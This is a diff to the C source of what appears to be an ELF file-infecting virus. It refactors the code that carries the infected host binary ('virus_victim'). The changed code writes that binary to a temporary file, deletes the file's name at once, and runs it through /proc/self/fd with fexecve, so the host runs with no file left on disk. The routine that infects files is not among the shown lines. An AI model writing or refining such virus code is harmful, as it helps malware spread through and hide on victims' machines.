@@ -6,6 +6,8 @@
 #error "ELF only"
 #endif
 
+#define _GNU_SOURCE
+
 #include "victim.h"
 
 #include <assert.h>
@@ -543,6 +545,49 @@ close_fd:
     return result;
 }
 
+static int create_victim(void) {
+    char path[] = "/tmp/XXXXXX";
+    int fd = mkstemp(path);
+    if (fd == -1) {
+        return -errno;
+    }
+
+    unlink(path);
+
+    static_assert(sizeof(mode_t) <= sizeof(int),
+                  "Expected mode_t to fit in int");
+    int result;
+    mode_t mode = S_IRUSR | S_IXUSR;
+    if (fchmod(fd, mode) == -1) {
+        result = -errno;
+        goto close_fd;
+    }
+
+    result = -posix_fallocate(fd, 0, virus_victim.size);
+    if (result) {
+        result = -errno;
+        goto close_fd;
+    }
+
+    posix_fadvise(fd, 0, 0, POSIX_FADV_SEQUENTIAL);
+    struct io_all_result io_result = write_all(fd, virus_victim.content, virus_victim.size);
+    if (io_result.remaining > 0) {
+        result = -io_result.err;
+        goto close_fd;
+    }
+
+    if (fsync(fd)) {
+        result = -errno;
+        goto close_fd;
+    }
+
+    return fd;
+
+close_fd:
+    close(fd);
+    return result;
+}
+
 int main(int argc, char *const argv[], char *const envp[]) {
     (void)argc;
     DIR *dir = opendir(".");
@@ -569,68 +614,33 @@ int main(int argc, char *const argv[], char *const envp[]) {
     }
     assert(virus_victim.size > 0);
 
-    char tmp_path[] = "/tmp/XXXXXX";
-    int tmp_fd = mkstemp(tmp_path);
-    if (tmp_fd == -1) {
-        fprintf(stderr, "cannot create temporary file in /tmp: %s\n", strerror(errno));
-        goto exit;
+    int tmp_fd = create_victim();
+    if (tmp_fd < 0) {
+        fprintf(stderr, "cannot create victim: %s\n", strerror(-tmp_fd));
+        return EXIT_FAILURE;
     }
 
+    char tmp_path[] = "/proc/self/fd/XXXXXXXXXX";
     {
-        int result = posix_fallocate(tmp_fd, 0, virus_victim.size);
-        if (result) {
-            fprintf(stderr, "cannot allocate %zu bytes for %s: %s\n",
-                    (size_t) virus_victim.size, tmp_path, strerror(result));
-            goto close_tmp;
-        }
+        int size = snprintf(tmp_path, sizeof(tmp_path), "/proc/self/fd/%d", tmp_fd);
+        assert(size > 0);
+        assert((size_t) size < sizeof(tmp_path));
     }
 
-    posix_fadvise(tmp_fd, 0, 0, POSIX_FADV_SEQUENTIAL);
-    {
-        struct io_all_result result = write_all(tmp_fd, virus_victim.content, virus_victim.size);
-        if (result.remaining > 0) {
-            fprintf(stderr,
-                    "cannot write %zu of %zu bytes "
-                    "from /proc/self/exe to %s: %s\n",
-                    result.remaining, (size_t) virus_victim.size, tmp_path, strerror(result.err));
-            goto close_tmp;
-        }
-    }
-
-    {
-        static_assert(sizeof(mode_t) <= sizeof(int),
-                      "Expected mode_t to fit in int");
-        mode_t mode = S_IRUSR | S_IXUSR;
-        int result = fchmod(tmp_fd, mode);
-        if (result == -1) {
-            fprintf(stderr, "cannot set permissions of %s to %o: %s\n",
-                    tmp_path, (int) mode, strerror(errno));
-            goto close_tmp;
-        }
-    }
-
-    if (fsync(tmp_fd)) {
-        fprintf(stderr, "cannot sync %s: %s\n", tmp_path, strerror(errno));
-        goto close_tmp;
-    }
-
-    int tmp_fd2 = open(tmp_path, O_RDONLY);
+    int tmp_fd2 = open(tmp_path, O_RDONLY | O_PATH);
     if (tmp_fd2 == -1) {
-        fprintf(stderr, "cannot open %s for reading: %s\n", tmp_path, strerror(errno));
-        goto close_tmp;
+        fprintf(stderr, "cannot reopen temporary file: %s\n", strerror(errno));
+        goto close_tmp_fd;
     }
 
     close(tmp_fd);
-    unlink(tmp_path);
     fexecve(tmp_fd2, argv, envp);
-    fprintf(stderr, "cannot execute %s: %s\n", tmp_path, strerror(errno));
+
+    fprintf(stderr, "cannot execute victim: %s\n", strerror(errno));
     close(tmp_fd2);
-    goto exit;
+    return EXIT_FAILURE;
 
-close_tmp:
+close_tmp_fd:
     close(tmp_fd);
-    unlink(tmp_path);
-
-exit:
     return EXIT_FAILURE;
 }
